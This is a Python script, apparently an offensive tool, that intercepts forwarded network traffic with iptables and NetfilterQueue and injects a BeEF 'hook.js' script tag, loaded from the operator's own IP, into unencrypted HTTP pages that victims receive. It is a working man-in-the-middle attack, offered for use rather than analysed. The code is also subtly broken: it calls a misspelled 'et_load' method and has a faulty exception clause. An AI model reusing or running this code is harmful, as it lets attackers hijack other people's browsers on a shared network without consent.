#!/usr/bin/env python

import netfilterqueue as nf
import scapy.all as scapy
import subprocess as sb
from logos import Logo
from termcolor import colored
import time
import re
import os

class injector:
	def __init__(self):
		logo = Logo()
		logo.inject_logo()
		self.IP_Address = raw_input(colored("\n[?] Insert your IP Address: ", 'yellow', attrs=['bold']))
		sb.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])
		sb.call(['beef-xss'])
		print(colored("\n[+] Beef-XSS started. \n", 'green', attrs=['reverse']))
		print(colored("[+]", 'yellow') + " IP table is set. Injecting the code if HTTP request is found.\n")
		try:
			queue = nf.NetfilterQueue()
			queue.bind(0, self.process_packet)
			queue.run()
		except KeyboardInterrupt:
			print("[-] Detected CTRL + C ... Resetting IPtables")
			sb.call(['iptables', '--flush'])
			print('[+] IPtables Flushed successfully :)')
		
	def set_load(self, packet, load):
		packet[scapy.Raw].load = load
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
		return packet

	def process_packet(self, packet):
		try:
			scapy_packet = scapy.IP(packet.get_payload())
			if scapy_packet.haslayer(scapy.Raw):
				load = scapy_packet[scapy.Raw].load
				if scapy_packet[scapy.TCP].dport == 80:
					print(colored('[+] Request!', 'yellow'))
					load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
					load = load.replace("HTTP/1.1", "HTTP/1.0")
				elif scapy_packet[scapy.TCP].sport == 80:
					print(colored('[+] Response!', 'green'))
					injection_code = '<script src="http://' + self.IP_Address + ':3000/hook.js"></script>'
					load = load.replace("</body>", injection_code + "</body>")
					content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
					if content_length_search and "text/html" in load:
						content_length = content_length_search.group(1)
						new_content_length = int(content_length) + len(injection_code)
						load = load.replace(content_length, str(new_content_length))
				if load != scapy_packet[scapy.Raw].load:
					new_packet = self.et_load(scapy_packet, load)
					packet.set_payload(str(new_packet))
				
			packet.accept()
		except AttributeError or IndexError:
			print(colored("[!] Encrypted Request!", 'yellow'))
		
		except KeyboardInterrupt:
			print(colored("[!] CTRL + C Detected. Exiting the programm.", "red"))

